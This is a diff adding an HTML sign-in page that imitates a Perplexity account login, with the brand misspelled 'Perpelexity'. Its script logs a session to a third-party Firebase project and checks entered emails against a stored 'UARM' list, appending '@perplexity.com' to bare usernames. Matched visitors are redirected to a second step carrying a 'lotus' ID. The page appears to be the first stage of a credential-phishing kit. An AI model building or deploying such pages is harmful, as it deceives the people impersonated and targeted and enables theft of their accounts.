@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in</title>
+    <style>
+        /* CSS reset and base styles */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+            color: #000;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 24px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        /* Input styling with floating label */
+        .input-group {
+            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 18px 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 12px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+            background: transparent;
+        }
+
+        .input-group input:focus {
+            border-color: #000;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 18px;
+            background: #fff;
+            padding: 0 4px;
+            color: #6b7280;
+            font-size: 16px;
+            transition: 0.2s ease all;
+            pointer-events: none;
+        }
+
+        /* Float the label when input is focused or has content */
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -10px;
+            font-size: 12px;
+            color: #555;
+        }
+
+        /* Button styling */
+        button {
+            width: 100%;
+            padding: 16px;
+            background-color: #000;
+            color: #fff;
+            border: none;
+            border-radius: 30px; /* Fully rounded corners */
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: #333;
+        }
+
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        #error-message {
+            color: #dc2626;
+            font-size: 14px;
+            margin-top: -15px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: left;
+            padding-left: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Perpelexity Account. The account will be added to this device and available to other our Apps & Services</p>
+
+        <div class="input-group">
+            <!-- Using placeholder=" " as a CSS trick to detect if input is empty -->
+            <input type="text" id="email" placeholder=" " required>
+            <label for="email">Email ID</label>
+        </div>
+        
+        <div id="error-message">Email ID not found. Please try again.</div>
+
+        <button id="continueBtn">Continue</button>
+    </div>
+
+    <!-- Firebase SDK Setup (Modular Version) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getFirestore, collection, doc, setDoc, query, where, getDocs, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
+
+        // Your specific Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+            authDomain: "question-metabase.firebaseapp.com",
+            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "question-metabase",
+            storageBucket: "question-metabase.firebasestorage.app",
+            messagingSenderId: "770698198753",
+            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+            measurementId: "G-6ZP1FPMKSJ"
+        };
+
+        // Initialize Firebase Apps and Firestore DB
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Utility: Generate Random 10-digit number
+        function generateSessionId() {
+            return Math.floor(1000000000 + Math.random() * 9000000000).toString();
+        }
+
+        let currentSessionId = "";
+
+        // Application Start: Handle Session Management
+        async function initializeSession() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let sessionId = urlParams.get('session');
+            
+            // Get 'continue' param if it exists in URL initially, default to empty string
+            let continueParam = urlParams.get('continue') || ""; 
+
+            if (!sessionId) {
+                // 1. Create ID
+                sessionId = generateSessionId();
+                
+                // 2. Update the browser URL bar dynamically, keeping the continue parameter
+                const newUrl = window.location.pathname + '?session=' + sessionId + '&continue=' + encodeURIComponent(continueParam);
+                window.history.replaceState({}, '', newUrl);
+
+                // 3. Save to Firestore under "ASPX Keys" (Includes the 'continue' data)
+                try {
+                    await setDoc(doc(db, "ASPX Keys", sessionId), {
+                        sessionId: sessionId,
+                        continue: continueParam, // <-- Saves the continue parameter to DB
+                        createdAt: serverTimestamp()
+                    });
+                } catch (error) {
+                    console.error("Error storing session to Firebase:", error);
+                }
+            }
+            return sessionId;
+        }
+
+        // Run the init function as soon as script runs
+        initializeSession().then(id => {
+            currentSessionId = id;
+        });
+
+
+        // Handle 'Continue' button logic
+        const continueBtn = document.getElementById('continueBtn');
+        const emailInput = document.getElementById('email');
+        const errorMsg = document.getElementById('error-message');
+
+        continueBtn.addEventListener('click', async () => {
+            let emailVal = emailInput.value.trim();
+
+            if (!emailVal) {
+                emailInput.focus();
+                return;
+            }
+
+            // Check if user just typed a username and missed @perplexity.com
+            if (!emailVal.includes('@')) {
+                emailVal += '@perplexity.com';
+                emailInput.value = emailVal; // visually update input field
+            }
+
+            // Set button to loading state
+            continueBtn.disabled = true;
+            continueBtn.textContent = 'Checking...';
+            errorMsg.style.display = 'none';
+
+            try {
+                // Query "UARM" database to check if email exists
+                const usersRef = collection(db, "UARM");
+                const q = query(usersRef, where("email", "==", emailVal));
+                const querySnapshot = await getDocs(q);
+
+                if (!querySnapshot.empty) {
+                    // User successfully found
+                    const userData = querySnapshot.docs[0].data();
+                    
+                    // --- FIX: Checks for both lowercase 'lotus' and uppercase 'Lotus' ---
+                    const lotusId = userData.lotus || userData.Lotus; 
+
+                    if (lotusId) {
+                        // Redirect to Step 2 passing parameters
+                        window.location.href = `2.html?session=${currentSessionId}&lotus=${lotusId}`;
+                    } else {
+                        alert("Account found, but Lotus ID is missing in database.");
+                        continueBtn.disabled = false;
+                        continueBtn.textContent = 'Continue';
+                    }
+
+                } else {
+                    // User Not Found - Error State
+                    errorMsg.style.display = 'block';
+                    continueBtn.disabled = false;
+                    continueBtn.textContent = 'Continue';
+                }
+            } catch (error) {
+                console.error("Error querying UARM database:", error);
+                alert("An error occurred while connecting. Please try again.");
+                continueBtn.disabled = false;
+                continueBtn.textContent = 'Continue';
+            }
+        });
+    </script>
+</body>
+</html>
